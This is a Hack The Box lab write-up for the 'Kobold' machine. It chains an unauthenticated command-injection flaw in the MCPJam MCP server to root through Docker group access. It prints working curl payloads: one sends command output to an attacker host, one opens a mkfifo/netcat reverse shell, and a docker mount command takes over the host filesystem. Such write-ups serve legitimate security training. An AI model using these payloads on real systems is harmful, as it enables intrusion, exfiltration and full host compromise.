---
title: "HTB-Kobold"
date: 2026-08-02
description: Kobold is a Linux machine centred around a recently disclosed vulnerability (CVE-2026-23744) in **MCPJam**, an open-source Model Context Protocol server. Initial access is gained through unauthenticated remote code execution via the MCP connect endpoint. Privilege escalation abuses Docker group membership to mount the host filesystem and read the root flag.

tags: ['CVE-2026-23744', 'MCP', 'RCE', 'Docker Escape', 'PrivateBin'] 
weight: 2
showToc: true
hidemeta: true
cascade:   
    showDate: false

---

## Overview

<table style="width:100%; table-layout:fixed;">
  <thead>
    <tr>
      <th style="width:40%; text-align:left;">Category</th>
      <th style="width:60%; text-align:left;">Info</th>
    </tr>
  </thead>
  <tbody>
    <tr><td>Machine Name</td><td>Kobold</td></tr>
    <tr><td>Difficulty</td><td>Easy</td></tr>
    <tr><td>Release Date</td><td>21 March, 2026</td></tr>
    <tr><td>Author</td><td>sau123</td></tr>
    <tr><td>OS</td><td>Linux</td></tr>
    <tr><td>Pwned Date</td><td>25 March, 2026</td></tr>
  </tbody>
</table>


## Reconnaissance

### Port Scan

```
22/tcp   — OpenSSH 9.6p1
80/tcp   — nginx (redirects to HTTPS)
443/tcp  — nginx + TLS (kobold.htb)
3552/tcp — Golang HTTP server (public)
```

### Subdomain Enumeration

Virtual host enumeration reveals two subdomains:

| Subdomain | Service |
|-----------|---------|
| `mcp.kobold.htb` | MCPJam (MCP server) |
| `bin.kobold.htb` | PrivateBin (reverse proxied to Docker container on 127.0.0.1:8080) |

---

## What is MCPJam?

MCPJam is an open-source **Model Context Protocol (MCP)** server. MCP is a protocol that allows AI assistants to connect to external tools and data sources. MCPJam acts as a bridge — it accepts a configuration from a client and spawns a local process that speaks the MCP JSON-RPC protocol over stdio.

The `/api/mcp/connect` endpoint accepts:

```json
{
  "serverConfig": {
    "command": "...",
    "args": [...],
    "env": {}
  },
  "serverId": "..."
}
```

It then spawns `command` with `args` as a subprocess. **CVE-2026-23744** is an unauthenticated server-side command injection — there is no authentication or input validation on this endpoint, allowing any caller to execute arbitrary OS commands on the server.

---

## What is PrivateBin?

PrivateBin is a minimalist, open-source pastebin where the **server has zero knowledge of stored data**. Pastes are encrypted and decrypted entirely in the browser using 256-bit AES, with the decryption key stored only in the URL fragment (`#key`). This means that even with full filesystem access to the server, paste content cannot be decrypted without the original URL.

In this box, PrivateBin runs inside a Docker container (`privatebin/nginx-fpm-alpine:2.0.2`) with its data directory bind-mounted from the host at `/privatebin-data`.

---

## Initial Access — CVE-2026-23744 (RCE via MCPJam)

### Confirming Blind RCE

The `/api/mcp/connect` endpoint spawns the supplied command directly. However, the server consumes the subprocess's stdout for MCP JSON-RPC communication, making this **blind RCE** — output is not returned in the HTTP response. [CVE-2026-23744](https://github.com/advisories/GHSA-232v-j27c-5pp6)

To confirm execution, exfiltrate output out-of-band via an HTTP callback:

```bash
curl -k https://mcp.kobold.htb/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{"serverConfig":{"command":"sh","args":["-c","id | curl -s http://<YOUR-IP>:4444/$(id | base64 -w0)"],"env":{}},"serverId":"mytest"}'
```

Listener receives:

```
GET /dWlkPTEwMDEoYmVuKSBnaWQ9MTAwMShiZW4pIGdyb3Vwcz0xMDAxKGJlbiksMzcob3BlcmF0b3IpCg==
```

Decoding: `uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)`

### Reverse Shell

Direct `bash -i >& /dev/tcp/...` redirection fails inside `sh`. The reliable approach is a named pipe:

```bash
curl -k https://mcp.kobold.htb/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{"serverConfig":{"command":"sh","args":["-c","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <YOUR-IP> 4444 >/tmp/f"],"env":{}},"serverId":"mytest"}'
```

Shell received as `ben`. **User flag retrieved from `/home/ben/user.txt`.**

---

## Enumeration as ben

### Groups

```
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

The `operator` group is non-standard and worth investigating.

### Internal Services

```
127.0.0.1:8080   — PrivateBin (Docker container)
127.0.0.1:6274   — Node.js (MCPJam backend)
:::3552          — Golang HTTP app (public)
```

### Network Interfaces

A Docker bridge (`docker0: 172.17.0.1`) is active with a veth pair, confirming a running container reachable at `172.17.0.2`.

### PrivateBin Data Directory

`/privatebin-data` is accessible to the `operator` group:

```
drwxrwx--- operator  /privatebin-data/certs/   ← TLS cert + private key for *.kobold.htb
drwxr-x--- gid=82    /privatebin-data/cfg/     ← Config (www-data only)
drwxrwxrwx operator  /privatebin-data/data/    ← Paste storage (empty)
```

The TLS certificate and private key for `*.kobold.htb` are readable. However, there are no stored pastes to decrypt — and even if there were, PrivateBin's zero-knowledge design means the ciphertext is useless without the URL fragment key.

The config file (readable via `docker exec`) contained commented-out example credentials (`Z3r0P4ss`) but these did not lead anywhere productive.

### Docker Access via Operator Group

```bash
newgrp docker
docker ps
```

```
CONTAINER ID   IMAGE                               PORTS
4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   127.0.0.1:8080->8080/tcp
```

The `operator` group has access to the Docker socket — a classic privilege escalation path equivalent to passwordless sudo.

---

## Privilege Escalation — Docker Host Filesystem Mount

With Docker socket access, the host filesystem can be mounted inside a new container. The default entrypoint of the PrivateBin image drops privileges to `nobody` (uid=65534), so it must be overridden:

```bash
docker run -it --rm \
  -v /:/mnt \
  --entrypoint sh \
  --user root \
  privatebin/nginx-fpm-alpine:2.0.2
```

Inside the container:

```
/var/www # id
uid=0(root) gid=0(root) groups=0(root),...
```

The entire host filesystem is now accessible under `/mnt`:

```bash
cat /mnt/root/root.txt
```

**Root flag retrieved.**

---

## Why `--entrypoint sh` Was Necessary

The default entrypoint (`/etc/init.d/rc.local`) starts PHP-FPM and nginx, then drops to `nobody`. Without overriding it, the container still runs as an unprivileged user even though the image is available. The `--user root` flag alone is insufficient if the entrypoint later switches users — overriding the entrypoint entirely bypasses this.

---

## Attack Chain Summary

```
Subdomain enum → mcp.kobold.htb (MCPJam)
        ↓
CVE-2026-23744 — Unauthenticated RCE via /api/mcp/connect
        ↓
Blind RCE as ben → out-of-band exfil → mkfifo reverse shell
        ↓
User flag (/home/ben/user.txt)
        ↓
ben is in operator group → Docker socket access (newgrp docker)
        ↓
docker run --user root -v /:/mnt → host filesystem as root
        ↓
Root flag (/root/root.txt)
```

---

## Key Takeaways

- **MCP servers expose powerful process-spawning APIs** — any internet-facing MCP endpoint must enforce strong authentication and command whitelisting. The MCP protocol was designed for local trusted use, not public exposure.
- **Blind RCE requires out-of-band exfiltration** — stdout is consumed by the MCP protocol layer; HTTP callbacks are the reliable exfil path.
- **Docker group = root** — membership in the Docker group is functionally equivalent to passwordless sudo on the host.
- **PrivateBin's zero-knowledge design held** — even with full filesystem and container access, encrypted pastes could not be read without the URL fragment decryption key.
